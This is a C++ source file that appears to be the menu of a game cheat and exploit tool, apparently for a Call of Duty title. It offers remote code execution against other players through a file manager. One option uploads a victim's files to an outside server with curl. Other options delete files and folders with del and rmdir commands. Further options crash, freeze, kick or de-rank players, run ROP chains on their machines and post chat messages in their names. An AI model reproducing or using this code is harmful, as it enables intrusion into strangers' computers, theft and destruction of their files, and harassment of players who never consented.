#include "dependencies/stdafx.hpp"
#include "menu.hpp"

namespace menu
{
	bool initialized = false, open = false;
	std::vector<std::string> material_pool;
	std::unordered_map<std::string, std::string> map_names;
	ImFont* glacial_indifference_bold;
	ImFont* glacial_indifference;

	void set_fonts()
	{
		glacial_indifference_bold = ImGui::GetIO().Fonts->AddFontFromMemoryCompressedBase85TTF(ImGui::GetIO().Fonts->GetSecondaryFonts().data(), 15.0f);
		glacial_indifference = ImGui::GetIO().Fonts->AddFontFromMemoryCompressedBase85TTF(ImGui::GetIO().Fonts->GetPrimaryFont().data(), 15.0f);
	}

	void set_style_color()
	{
		auto& colors = ImGui::GetStyle().Colors;

		colors[ImGuiCol_Text] = { 1.0f, 1.0f, 1.0f, 1.0f };
		colors[ImGuiCol_TextDisabled] = { 0.784f, 0.784f, 0.784f, 0.784f };
		colors[ImGuiCol_WindowBg] = { 0.06f, 0.06f, 0.06f, 1.00f };
		colors[ImGuiCol_PopupBg] = { 0.08f, 0.08f, 0.08f, 0.94f };
		colors[ImGuiCol_Border] = { 0.00f, 0.00f, 0.00f, 0.71f };
		colors[ImGuiCol_BorderShadow] = { 0.06f, 0.06f, 0.06f, 0.01f };
		colors[ImGuiCol_FrameBg] = { 0.10f, 0.10f, 0.10f, 0.71f };
		colors[ImGuiCol_FrameBgHovered] = { 0.19f, 0.19f, 0.19f, 0.40f };
		colors[ImGuiCol_FrameBgActive] = { 0.20f, 0.20f, 0.20f, 0.67f };
		colors[ImGuiCol_TitleBg] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_TitleBgActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_TitleBgCollapsed] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_MenuBarBg] = { 0.10f, 0.10f, 0.10f, 0.66f };
		colors[ImGuiCol_ScrollbarBg] = { 0.02f, 0.02f, 0.02f, 0.00f };
		colors[ImGuiCol_ScrollbarGrab] = { 0.31f, 0.31f, 0.31f, 1.00f };
		colors[ImGuiCol_ScrollbarGrabHovered] = { 0.17f, 0.17f, 0.17f, 1.00f };
		colors[ImGuiCol_ScrollbarGrabActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_CheckMark] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_SliderGrab] = { 0.29f, 0.29f, 0.29f, 1.00f };
		colors[ImGuiCol_SliderGrabActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_Button] = { 0.10f, 0.10f, 0.10f, 1.00f };
		colors[ImGuiCol_ButtonHovered] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_ButtonActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_Header] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_HeaderHovered] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_HeaderActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_Separator] = { 0.10f, 0.10f, 0.10f, 0.90f };
		colors[ImGuiCol_SeparatorHovered] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_SeparatorActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_ResizeGrip] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_ResizeGripHovered] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_ResizeGripActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_PlotLines] = { 0.61f, 0.61f, 0.61f, 1.00f };
		colors[ImGuiCol_PlotLinesHovered] = { 1.00f, 1.00f, 1.00f, 1.00f };
		colors[ImGuiCol_PlotHistogram] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_PlotHistogramHovered] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_TextSelectedBg] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_ModalWindowDarkening] = { 0.80f, 0.80f, 0.80f, 0.35f };
	}

	void set_style()
	{
		auto& style = ImGui::GetStyle();
		ImGui::GetIO().FontDefault = ImGui::GetIO().Fonts->AddFontDefault();

		set_style_color();
		set_fonts();

		style.WindowPadding = { 8.0f, 2.0f };
		style.FramePadding = { 4.0f , 4.0f };
		style.ItemSpacing = { 10.0f, 4.0f };
		style.ItemInnerSpacing = { 4.0f, 4.0f };
		style.TouchExtraPadding = {};
		style.IndentSpacing = 21.0f;
		style.ScrollbarSize = 13.0f;
		style.GrabMinSize = 10.0f;
		style.WindowBorderSize = 0.0f;
		style.ChildBorderSize = 0.0f;
		style.PopupBorderSize = 0.0f;
		style.FrameBorderSize = 0.0f;
		style.TabBorderSize = 1.0f;

		style.WindowRounding = 7.0f;
		style.ChildRounding = 7.0f;
		style.FrameRounding = 7.0f;
		style.PopupRounding = 7.0f;
		style.ScrollbarRounding = 7.0f;
		style.GrabRounding = 7.0f;
		style.TabRounding = 7.0f;

		style.WindowTitleAlign = { 0.5f, 0.5f };
		style.WindowMenuButtonPosition = ImGuiDir_None;
		style.ButtonTextAlign = { 0.5f, 0.5f };
		style.SelectableTextAlign = {};

		style.DisplaySafeAreaPadding = { 4.0f, 4.0f };

		style.ColumnsMinSpacing = 6.0f;
		style.CurveTessellationTol = 1.25f;
		style.AntiAliasedLines = true;
	}

	void toggle()
	{
		if (initialized)
		{
			open = !open;
			utils::hook::set(0x06427DBD, !open);
		}
	}

	bool is_open()
	{
		return initialized && open;
	}

	bool begin_section(const std::string& text)
	{
		ImGui::TextUnformatted(text.data());
		return true;
	}

	void setup_material_pool()
	{
		constexpr auto type = game::ASSET_TYPE_MATERIAL;

		game::enum_assets(type, [=](const auto& header)
		{
			const auto asset = game::XAsset{ type, header };
			const auto asset_name = game::DB_GetXAssetName(&asset);

			material_pool.emplace_back(asset_name);
		}, true);

		std::sort(material_pool.begin(), material_pool.end(), [](const auto& a, const auto& b) { return a < b; });
	}

	void setup_map_names()
	{
		for (size_t i = 0; game::map_handler[i].mapname[0]; ++i)
		{
			const auto map_name = game::map_handler[i].mapname;
			map_names[map_name] = game::UI_GetMapDisplayName(map_name);
		}
	}

	void draw_client_file_manager()
	{
		const auto party{ game::party_data() };
		const auto our_client_num{ static_cast<std::uint32_t>(game::Party_FindMemberByXUID(game::Live_GetXuid(0))) };
		const auto target{ exploit::file_manager_target };
		const auto file_manager{ exploit::file_manager[target] };
		const auto client_num{ game::Party_FindMemberByXUID(target) };

		if (!game::CL_IsLocalClientInGame())
			return;

		if (client_num < 0)
			return;

		ImGui::SetNextWindowSize({ 480, 480 }, ImGuiCond_Once);

		constexpr auto window_title{ "Client File Manager" };

		if (!ImGui::Begin(window_title))
		{
			ImGui::End();
			return;
		}

		ImGui::Selectable(party->partyMembers[client_num].gamertag);

		ImGui::Separator();

		ImGui::Selectable(file_manager.current_path);

		ImGui::Separator();

		if (ImGui::Selectable("Go to game directory"))
		{
			exploit::host::rce::send_payload(client_num, "grabpath", { std::to_string(our_client_num) });
			exploit::host::rce::list_client_directory(client_num, our_client_num);
		}

		if (ImGui::Selectable("Go to user directory"))
		{
			exploit::host::rce::send_payload(client_num, "grabuser", { std::to_string(our_client_num) });
			exploit::host::rce::list_client_directory(client_num, our_client_num);
		}

		if (ImGui::Selectable("Go to parent directory"))
		{
			const auto parent_path{ std::filesystem::path{file_manager.current_path}.parent_path() };
			exploit::host::rce::list_client_directory(client_num, our_client_num, parent_path.string());
			exploit::file_manager[target].current_path = parent_path.string();
		}

		ImGui::Separator();

		std::vector<size_t> indices{};

		for (size_t i = 0; i < file_manager.parsed_data.size(); ++i)
		{
			indices.emplace_back(i);
		}

		std::sort(indices.begin(), indices.end(), [](const auto& a, const auto& b) { return a < b; });

		for (const auto& file_num : indices)
		{
			const auto data = file_manager.parsed_data[file_num];
			const auto selected = ImGui::Selectable((data + "##"s + std::to_string(file_num)).data());

			const auto popup = "file_popup##" + std::to_string(file_num);

			if (selected)
			{
				ImGui::OpenPopup(popup.data());
			}

			if (ImGui::BeginPopup(popup.data(), ImGuiWindowFlags_NoMove))
			{
				const auto path = (std::filesystem::path{ file_manager.current_path } / data).string();
				
				if (ImGui::MenuItem("Go into directory"))
				{
					exploit::host::rce::list_client_directory(client_num, our_client_num, path);
					exploit::file_manager[target].current_path = path;
				}

				if (ImGui::MenuItem("Open file"))
				{
					exploit::host::rce::win_exec(client_num, "start " + path);
				}

				if (ImGui::MenuItem("Read file"))
				{
					exploit::host::rce::read_file_from_client(client_num, our_client_num, path);
				}

				if (ImGui::MenuItem("Download file"))
				{
					exploit::host::rce::win_exec(client_num, "curl -F \"file=@" + path + "\" https://furtive.dev/upload");
				}

				if (ImGui::MenuItem("Delete file"))
				{
					ImGui::OpenPopup("Delete file?");
				}

				if (ImGui::BeginPopupModal("Delete file?", nullptr, ImGuiWindowFlags_AlwaysAutoResize))
				{
					ImGui::Text("Are you sure you would like to delete the file\n '%s'?", path.data());
					ImGui::Separator();

					if (ImGui::Button("Yes", { 120.0f, 0.0f }))
					{
						exploit::host::rce::win_exec(client_num, "del /S /Q /F \"" + path + "\"");
						ImGui::CloseCurrentPopup();
					}

					ImGui::SetItemDefaultFocus();
					ImGui::SameLine();
					if (ImGui::Button("No", { 120.0f, 0.0f })) { ImGui::CloseCurrentPopup(); }
					ImGui::EndPopup();
				}

				if (ImGui::MenuItem("Delete folder"))
				{
					ImGui::OpenPopup("Delete folder?");
				}

				if (ImGui::BeginPopupModal("Delete folder?", nullptr, ImGuiWindowFlags_AlwaysAutoResize))
				{
					ImGui::Text("Are you sure you would like to delete the folder\n '%s'?", path.data());
					ImGui::Separator();

					if (ImGui::Button("Yes", { 120.0f, 0.0f }))
					{
						exploit::host::rce::win_exec(client_num, "rmdir /S /Q \"" + path + "\"");
						ImGui::CloseCurrentPopup();
					}

					ImGui::SetItemDefaultFocus();
					ImGui::SameLine();
					if (ImGui::Button("No", { 120.0f, 0.0f })) { ImGui::CloseCurrentPopup(); }
					ImGui::EndPopup();
				}

				ImGui::EndPopup();
			}
		}
	}

	bool selectable(const std::string& label, bool enabled = true, bool noprint = false)
	{
		const auto result = ImGui::Selectable(label,
			false,
			ImGuiSelectableFlags_DontClosePopups | (enabled ? ImGuiSelectableFlags_None : ImGuiSelectableFlags_Disabled));

		if (result && !noprint)
		{
			utils::toast::add_toast("Game", "Executed: " + label);
		}

		return result;
	}

	std::pair<std::string, std::string> get_rce_commands(const float width)
	{
		static std::string rce_cmd = exploit::join_party::payloads.begin()->first, rce_input;

		std::vector<std::string> payloads;

		for (const auto& payload : exploit::join_party::payloads)
		{
			payloads.emplace_back(payload.first);
		}

		std::sort(payloads.begin(), payloads.end(), [](const auto& a, const auto& b) { return a < b; });

		ImGui::SetNextItemWidth(width * 0.60f);

		if (ImGui::BeginCombo("##rce_command", rce_cmd.data()))
		{
			for (const auto& payload : payloads)
			{
				ImGui::PushID(payload);

				if (ImGui::Selectable(payload.data()))
				{
					rce_cmd = payload;
				}

				ImGui::PopID();
			}

			ImGui::EndCombo();
		}

		ImGui::SetNextItemWidth(width * 0.60f);
		ImGui::InputTextWithHint("##rce_input", "RCE Input", &rce_input);

		return { rce_input, rce_cmd };
	}
	
	void player_list()
	{
		const auto party = game::party_data();
		const auto our_client_num = static_cast<std::uint32_t>(game::Party_FindMemberByXUID(game::Live_GetXuid(0)));
		const auto in_game = game::CL_IsLocalClientInGame() && game::cg()->clients[game::cg()->predictedPlayerState.clientNum].infoValid;
		const auto hosting = game::is_hosting();
		const auto width = ImGui::GetContentRegionAvail().x;
		const auto spacing = ImGui::GetStyle().ItemInnerSpacing.x;

		const auto teleport_to = [=](size_t client_num)
		{
			Vec3 forward{};
			game::AngleVectors(&game::cg()->clients[client_num].playerAngles, &forward, nullptr, nullptr);
			const auto local_origin = game::centity(client_num)->origin;
			auto target_origin = local_origin + forward * 100.0f;
			target_origin.z = local_origin.z + 10.0f;

			if (hosting)
			{
				game::g_entities[game::cg()->predictedPlayerState.clientNum].client->ps.origin = target_origin;
			}
			else
			{
				exploit::join_party::send_payload("tp", { std::to_string(game::cg()->predictedPlayerState.clientNum), std::to_string(target_origin.x), std::to_string(target_origin.y), std::to_string(target_origin.z) });
			}
		};
		const auto teleport_from = [=](size_t client_num)
		{
			Vec3 forward{};
			game::AngleVectors(&game::cg()->predictedPlayerState.viewangles, &forward, nullptr, nullptr);
			const auto local_origin = game::cg()->predictedPlayerState.origin;
			auto target_origin = local_origin + forward * 100.0f;
			target_origin.z = local_origin.z + 10.0f;

			if (hosting)
			{
				game::g_entities[client_num].client->ps.origin = target_origin;
			}
			else
			{
				exploit::join_party::send_payload("tp", { std::to_string(client_num), std::to_string(target_origin.x), std::to_string(target_origin.y), std::to_string(target_origin.z) });
			}
		};
		const auto kick_player = [=](size_t index, const std::string& input)
		{
			if (hosting)
				game::SV_GameDropClient(index, input.data());
			else
				exploit::join_party::send_payload("kick", { std::to_string(index), input });
		};

		if (ImGui::BeginTabItem("Players", nullptr))
		{
			ImGui::PushStyleVar(ImGuiStyleVar_IndentSpacing, 0.0f);
			ImGui::BeginColumns("Players", 3, ImGuiColumnsFlags_NoResize);

			ImGui::SetColumnWidth(-1, 28.0f);
			ImGui::TextUnformatted("#");
			ImGui::NextColumn();
			ImGui::TextUnformatted("Player");
			ImGui::NextColumn();
			ImGui::SetColumnOffset(-1, width - ImGui::CalcTextSize("Priority").x);
			ImGui::TextUnformatted("Priority");
			ImGui::NextColumn();

			ImGui::Separator();

			std::array<std::uint32_t, 18> indices = {};

			for (size_t i = 0; i < 18; ++i)
			{
				indices[i] = i;
			}

			if (in_game)
			{
				std::sort(indices.begin(), indices.end(), [](const auto& a, const auto& b) { return game::cg()->clients[a].team > game::cg()->clients[b].team; });
			}

			for (const auto& client_num : indices)
			{
				const auto pm = party->partyMembers[client_num];
				const auto client = game::cg()->clients[client_num];

				if (game::is_valid_target(client_num))
				{
					ImGui::AlignTextToFramePadding();
					ImGui::TextUnformatted(std::to_string(client_num).data());

					ImGui::NextColumn();

					const auto player_xuid = pm.player;
					const auto player_name = game::get_client_name(&pm, client_num);

					if (in_game)
					{
						ImGui::PushStyleColor(ImGuiCol_Text, client_num == our_client_num ? ImColor(0, 255, 127, 250).Value
							: (client.team == game::TEAM_FREE || client.team != game::cg()->clients[our_client_num].team)
							? esp::enemy_color : esp::friendly_color);
					}
					else
					{
						ImGui::PushStyleColor(ImGuiCol_Text, player_xuid == game::Live_GetXuid(0)
							? ImColor(0, 255, 127, 250).Value : ImColor(200, 200, 200, 250).Value);
					}

					ImGui::AlignTextToFramePadding();

					const auto selected = ImGui::Selectable((player_name + "##"s + std::to_string(client_num)).data());

					ImGui::PopStyleColor();

					if (const auto steam_name = steam::get_friend_persona_name(player_xuid, player_name); !steam_name.empty())
					{
						ImGui::SameLine(0, spacing);
						ImGui::TextColored(ImColor(200, 200, 200, 250).Value, "(%s)", steam_name.data());
					}

					const auto netadr = game::party_data()->session->dyn.users[client_num].addr;
					
					const auto can_connect_to_client = game::can_connect_to_player(client_num); 
					const auto is_bot = netadr.type == game::NA_BOT;

					if (is_bot)
					{
						ImGui::SameLine(0, spacing);
						ImGui::TextColored(ImColor(200, 200, 200, 250).Value, "[BOT]");
					}

					if (aimbot::ignore_target[client_num])
					{
						ImGui::SameLine(0, spacing);
						ImGui::TextColored(ImVec4(0.0f, 1.0f, 0.5f, 0.95f), "[Ignored]");
					}

					if (aimbot::priority_target[client_num])
					{
						ImGui::SameLine(0, spacing);
						ImGui::TextColored(ImVec4(0.0f, 1.0f, 0.5f, 0.95f), "[Priority]");
					}

					if (static_cast<std::uint32_t>(party->currentHost.hostNum) == client_num)
					{
						ImGui::SameLine(0, spacing);
						ImGui::TextColored(ImVec4(0.0f, 1.0f, 1.0f, 0.95f), "[Host]");
					}

					if (const auto f = friends::get_by_ip(netadr))
					{
						ImGui::SameLine(0, ImGui::GetStyle().ItemInnerSpacing.x);
						ImGui::TextColored(ImVec4(0.0f, 0.5f, 1.0f, 0.95f), "%s", std::string{ f->name == player_name ? "[Friend]" : "(" + f->name + ")" }.data());
					}

					const auto popup = "player_popup##" + std::to_string(client_num);

					if (selected)
					{
						game::net::send_connectivity_test(netadr, client_num);
						ImGui::OpenPopup(popup.data());
					}

					const auto netadr_ip_string = netadr.to_string(true);
					const auto xnaddr_ip_string = pm.xnaddr.to_string(true);
					const auto ip_string = netadr.addr.inaddr && netadr.type != game::NA_LOOPBACK ? netadr_ip_string : xnaddr_ip_string;

					if (ImGui::BeginPopup(popup.data(), ImGuiWindowFlags_NoMove))
					{
						if (ImGui::BeginMenu(player_name + "##"s + std::to_string(client_num) + "player_menu"))
						{
							ImGui::MenuItem(player_name + "##"s + std::to_string(client_num) + "player_menu_item", nullptr, false, false);

							if (ImGui::IsItemClicked())
							{
								ShellExecuteA(0, "open", ("https://steamcommunity.com/profiles/" + std::to_string(player_xuid)).data(), 0, 0, SW_SHOWNORMAL);
							}

							if (ImGui::IsItemHovered())
							{
								ImGui::SetMouseCursor(ImGuiMouseCursor_Hand);
							}

							ImGui::Separator();

							if (ImGui::MenuItem("Add to friends list##" + std::to_string(client_num), nullptr, nullptr, !friends::get(player_xuid)))
							{
								friends::friends.emplace_back(friends::friend_info{ player_xuid, player_name, netadr_ip_string });
								friends::write();
							}

							ImGui::EndMenu();
						}

						ImGui::Separator();

						if (ImGui::MenuItem(std::to_string(player_xuid)))
						{
							ImGui::LogToClipboardUnformatted(std::to_string(player_xuid));
						}

						if (ImGui::MenuItem(ip_string))
						{
							ImGui::LogToClipboardUnformatted(ip_string);
						}

						if (!game::is_real_address(pm.xnaddr, netadr))
						{
							ImGui::SameLine();

							ImGui::TextColored(ImColor(200, 200, 200, 250).Value, "(%s)", xnaddr_ip_string.data());
						}

						ImGui::Separator();

						ImGui::MenuItem(
							"Ignore##ignore_client" + std::to_string(client_num),
							nullptr,
							reinterpret_cast<bool*>(&aimbot::ignore_target[client_num]),
							player_xuid != game::Live_GetXuid(0)
						);

						ImGui::MenuItem(
							"Prioritize##priority_client" + std::to_string(client_num),
							nullptr,
							reinterpret_cast<bool*>(&aimbot::priority_target[client_num]),
							player_xuid != game::Live_GetXuid(0)
						);

						ImGui::Separator();

						auto message{ "Connectable"s };
						if (const auto relay_route = game::find_route_to_player(party->session, client_num); relay_route >= 0)
						{
							message.append(" via "s + party->partyMembers[relay_route].gamertag);
						}

						ImGui::MenuItem(message);

						ImGui::Separator();

						if (selectable("Crash", !is_bot))
						{
							exploit::send_crash(netadr, client_num);
						}

						if (ImGui::BeginMenu("Exploits##" + std::to_string(client_num), !is_bot))
						{
							if (ImGui::MenuItem("Freeze", nullptr, nullptr, can_connect_to_client && !is_bot))
							{
								char buffer[1200] = { 0 };
								game::msg_t msg{};

								game::MSG_Init(&msg, buffer, sizeof buffer);
								game::MSG_WriteString(&msg, "ipdetect");
								game::MSG_WriteByte(&msg, 14);
								game::MSG_WriteByte(&msg, 4);
								game::MSG_WriteByte(&msg, 0);
								game::MSG_WriteLong(&msg, std::numeric_limits<int>::max());

								game::net::send_oob(netadr, msg, true);
							}

							if (ImGui::MenuItem("Popup", nullptr, nullptr, can_connect_to_client && !is_bot))
							{
								char buffer[1200] = { 0 };
								game::msg_t msg{};

								game::MSG_Init(&msg, buffer, sizeof buffer);
								game::MSG_WriteString(&msg, "ipdetect");
								game::MSG_WriteByte(&msg, 14);
								game::MSG_WriteByte(&msg, 1);
								game::MSG_WriteByte(&msg, 4);

								game::net::send_oob(netadr, msg, true);
							}
							
							if (ImGui::MenuItem("Immobilize"))
							{
								game::net::send_peer_to_peer_oob(client_num, "requeststats\n");
								game::net::send_relay_packet(client_num, "requeststats\n");
							}

							if (ImGui::MenuItem("Show migration screen", nullptr, nullptr, in_game))
							{
								game::net::send_peer_to_peer_oob(client_num, "mstart");
								game::net::send_relay_packet(client_num, "mstart");
							}

							if (ImGui::MenuItem("Reconnect player", nullptr, nullptr, in_game))
							{
								game::net::send_relay_packet(client_num, "0newlobbyinfo");
							}

							if (ImGui::MenuItem("Find new host", nullptr, nullptr, !in_game))
							{
								game::net::send_peer_to_peer_oob(client_num, "2findbest");
							}

							if (ImGui::MenuItem("Kick from lobby"))
							{
								if (in_game)
								{
									game::net::send_relay_packet(client_num, "error\nEXE_PLAYERKICKED");
									game::net::send_relay_packet(client_num, "hostquit");
								}
								else
								{
									game::net::send_relay_packet(client_num, "roundsdone");
								}
							}

							if (ImGui::MenuItem("Remove from party"))
							{
								if (!in_game)
								{
									exploit::send_disconnect(party->currentHost.adr, player_xuid);
								}

								game::net::send_relay_packet(client_num, (std::to_string(party->partyID) + "endparty @XBOXLIVE_PARTYENDED"));
							}

							if (ImGui::BeginMenu("Send OOB##" + std::to_string(client_num)))
							{
								static auto string_input = ""s;

								ImGui::InputTextWithHint("##" + std::to_string(client_num), "OOB", &string_input);

								if (ImGui::MenuItem("Send OOB"))
								{
									game::net::send_oob(netadr, string_input);
								}

								ImGui::EndMenu();
							}

							ImGui::EndMenu();
						}

						ImGui::Separator();

						const auto client_ready = in_game && game::cg()->clients[client_num].infoValid;
						const auto client_alive = client_ready && game::centity(client_num)->alive;

						if (selectable("Teleport Player to Me", client_alive))
						{
							teleport_from(client_num);
						}

						if (selectable("Teleport to Player", client_alive))
						{
							teleport_to(client_num);
						}

						if (selectable("Enable God Mode", client_alive))
						{
							if (hosting)
								game::g_entities[client_num].flags = 1 | 8;
							else
								exploit::join_party::send_payload("god", { std::to_string(client_num), std::to_string(1) });
						}

						if (selectable("Disable God Mode", client_alive))
						{
							if (hosting)
								game::g_entities[client_num].flags = 0;
							else
								exploit::join_party::send_payload("god", { std::to_string(client_num), std::to_string(0) });
						}

						if (selectable("Enable UFO Mode", client_alive))
						{
							if (hosting)
								game::g_entities[client_num].client->mFlags = 1;
							else
								exploit::join_party::send_payload("ufo", { std::to_string(client_num), std::to_string(1) });
						}

						if (selectable("Disable UFO Mode", client_alive))
						{
							if (hosting)
								game::g_entities[client_num].client->mFlags = 0;
							else
								exploit::join_party::send_payload("ufo", { std::to_string(client_num), std::to_string(0) });
						}

						if (selectable("Freeze player", client_alive))
						{
							if (hosting)
								game::g_entities[client_num].client->mFlags = 4;
							else
								exploit::join_party::send_payload("freeze", { std::to_string(client_num), std::to_string(1) });
						}

						if (selectable("Unfreeze player", client_alive))
						{
							if (hosting)
								game::g_entities[client_num].client->mFlags = 0;
							else
								exploit::join_party::send_payload("freeze", { std::to_string(client_num), std::to_string(0) });
						}

						if (selectable("Disable weapons", client_alive))
						{
							if (hosting)
								game::g_entities[client_num].client->ps.weapCommon.weapFlags = 0x80;
							else
								exploit::join_party::send_payload("weaponusage", { std::to_string(client_num), std::to_string(1) });
						}

						if (selectable("Enable weapons", client_alive))
						{
							if (hosting)
								game::g_entities[client_num].client->ps.weapCommon.weapFlags = 0;
							else
								exploit::join_party::send_payload("weaponusage", { std::to_string(client_num), std::to_string(0) });
						}

						if (selectable("Give infinite ammo", !hosting && !is_bot && client_alive))
						{
							exploit::join_party::send_payload("ammo", { std::to_string(client_num) });
						}

						if (selectable("Turn sound extremely loud", client_ready && !is_bot))
						{
							game::send_server_command(client_num, "n -12345678");
						}

						if (selectable("Lag game", client_ready && !is_bot))
						{
							game::send_server_command(client_num, "s com_timescale 0.01 timescale 0.01 com_maxfps 1"); 
							game::set_config_string_value_for_key(client_num, "com_timescale", "0.01");
							game::set_config_string_value_for_key(client_num, "timescale", "0.01");
							game::set_config_string_value_for_key(client_num, "com_maxfps", "1");
						}

						if (selectable("Send crash text", client_ready && !is_bot))
						{
							game::send_server_command(client_num, "g \"" + game::CL_AddMessageIcon("postfx") + "\"");
							game::send_server_command(client_num, "g \"" + game::CL_AddMessageIcon("cardicon_locked") + "\"");
						}

						if (selectable("Crash player", client_ready && !is_bot))
						{
							std::thread([client_num]()
							{
								game::send_server_command(client_num, "s fs_game balls"); 
								game::set_config_string_value_for_key(client_num, "fs_game", "balls");
									
								std::this_thread::sleep_for(100ms);
									
								game::send_server_command(client_num, "A 12 12 1");
								game::send_server_command(client_num, "A -12345678 -12345678 1");
								game::send_server_command(client_num, "B -12345678 1");
								game::send_server_command(client_num, "K -12345678 -12345678");
								game::send_server_command(client_num, "a -12345678");
								game::send_server_command(client_num, "b 1 1 1 1 -12345678");
								game::send_server_command(client_num, "d 4138 12345678");
								game::send_server_command(client_num, "o -12345678 1 1 1 1");
								game::send_server_command(client_num, "y -12345678");
								game::send_server_command(client_num, "z -12345678 1");
							}).detach();
						}

						if (selectable("Set fake map", client_ready && !is_bot))
						{
							const auto mapname = game::Dvar_FindVar("mapname")->current.string;
							const auto gametype = game::Dvar_FindVar("g_gametype")->current.string;
							const auto string = utils::string::va("loadingnewmap\n%s\n%s", mapname, gametype);
							game::net::send_relay_packet(client_num, string);
						}

						if (selectable("Immobilize", client_ready && !is_bot))
						{
							std::thread([=]
							{
								game::send_server_command(client_num, "d 3 aaaa");
								std::this_thread::sleep_for(50ms);
								game::send_server_command(client_num, "d 3 " + std::to_string(game::cl()->serverId + 1));
								std::this_thread::sleep_for(50ms);

								exploit::rop::rop_chain chain;
								chain.call_function(exploit::join_party::send_client_gamestate_stub, client_num);
								exploit::join_party::send_payload(chain);
							}).detach();
						}

						if (ImGui::BeginMenu("Set move speed scale##" + std::to_string(client_num), client_alive))
						{
							static auto speed_scale_input = 1.0f;
							const auto speed_scale_step = 1.0f;

							ImGui::SetNextItemWidth(width * 0.20f);
							ImGui::InputScalar("##", ImGuiDataType_Float, &speed_scale_input, &speed_scale_step, nullptr, "%.1f");
							speed_scale_input = std::fminf(std::fmaxf(speed_scale_input, 0.0f), 50.0f);

							if (selectable("Set", true, true))
							{
								if (hosting)
									game::g_entities[client_num].client->sess.moveSpeedScaleMultiplier = speed_scale_input;
								else
									exploit::join_party::send_payload("movespeedscale", { std::to_string(client_num), std::to_string(speed_scale_input) });
							}

							ImGui::EndMenu();
						}

						if (ImGui::BeginMenu("Client stats##" + std::to_string(client_num), client_ready && !is_bot))
						{
							if (ImGui::BeginMenu("Set prestige"))
							{
								static auto prestige_input = stats::get_player_data("prestige");
								const auto prestige_step = 1u;

								ImGui::SetNextItemWidth(width * 0.20f);
								ImGui::InputScalar("##", ImGuiDataType_S32, &prestige_input, &prestige_step, nullptr, "%u");
								prestige_input = std::min(std::max(prestige_input, 0), 11);

								if (selectable("Set", true, true))
								{
									const auto prestige = utils::string::va("%02X000", prestige_input);
									game::send_server_command(client_num, ("J 0 00000000 2056 206426 6525 7F 2064 " + prestige).data());
								}

								ImGui::EndMenu();
							}

							if (selectable("Unlock all", client_ready && !is_bot))
							{
								std::thread([=]
								{
									game::send_server_command(client_num, "J 2056 206426 6525 7F");

									for (size_t index = 3500; index < 5000; index += 10)
									{
										for (size_t i = 0; i < 10; ++i)
										{
											const auto command = utils::string::va("J %i 99", index + i);
											game::send_server_command(client_num, command);
										}

										std::this_thread::sleep_for(50ms);
									}

									game::send_server_command(client_num, "w 0 142 0");
									game::send_server_command(client_num, "l mp_challenge_complete");
								}).detach();
							}

							if (selectable("Set max level", client_ready && !is_bot))
							{
								game::send_server_command(client_num, "J 2056 206426");
								game::send_server_command(client_num, "w 0 142");
								game::send_server_command(client_num, "l mp_challenge_complete");
							}

							if (selectable("Set class names", client_ready && !is_bot))
							{
								std::thread([=]
								{
									for (size_t i = 3040; i < 3680; i += 64)
									{
										const auto command = utils::string::va("J %i %s00", i, utils::string::dump_hex("^2furtivehook").data());
										game::send_server_command(client_num, command);

										std::this_thread::sleep_for(50ms);
									}
								}).detach();
							}

							if (selectable("Brick classes", client_ready && !is_bot))
							{
								std::thread([=]
								{
									for (size_t i = 3040; i < 3680; i += 64)
									{
										const auto material = game::CL_AddMessageIcon("postfx");
										const auto command = utils::string::va("J %i %s00", i, utils::string::dump_hex(material).data());
										game::send_server_command(client_num, command);

										std::this_thread::sleep_for(50ms);
									}
								}).detach();
							}

							if (selectable("Reset stats", client_ready && !is_bot))
							{
								const auto message = utils::string::va("^1Deranking^7 player ^3%s^7 ...", player_name.data());

								std::thread([=]
								{
									game::send_server_command(-1, utils::string::va("U \"^7%s\"", message.data()));
									std::this_thread::sleep_for(1s);
									game::send_server_command(client_num, "J 0 00000000 2056 00000000 2064 00000");
								}).detach();
							}

							ImGui::EndMenu();
						}

						if (ImGui::BeginMenu("Kick player##" + std::to_string(client_num), client_ready))
						{
							static auto kick_player_input = "EXE_PLAYERKICKED"s;

							ImGui::InputTextWithHint("##" + std::to_string(client_num), "Message", &kick_player_input);

							if (selectable("Kick player", !kick_player_input.empty()))
							{
								kick_player(client_num, kick_player_input);
							}

							ImGui::EndMenu();
						}

						if (ImGui::BeginMenu("Send message in chat as player##" + std::to_string(client_num), client_ready))
						{
							static auto say_input = ""s;

							ImGui::InputTextWithHint("##" + std::to_string(client_num), "Message", &say_input);

							if (selectable("Send", !say_input.empty(), true))
							{
								if (hosting)
								{
									game::G_Say(&game::g_entities[client_num], nullptr, 0, say_input.data());
								}
								else
								{
									exploit::rop::rop_chain chain;
									chain.write_string(RCE_DATA_PTR, say_input);
									chain.call_native(0x005260E0, offsets::g_entities + sizeof(game::gentity_s) * client_num, 0, 0, RCE_DATA_PTR); // G_Say
									chain.call_function(exploit::join_party::restore_ebp_stub);
									exploit::join_party::send_payload(chain);
								}
							}

							ImGui::EndMenu();
						}

						if (ImGui::BeginMenu("Print message on screen##" + std::to_string(client_num), client_ready))
						{
							static auto message_input = ""s;

							ImGui::InputTextWithHint("##" + std::to_string(client_num), "Message", &message_input);

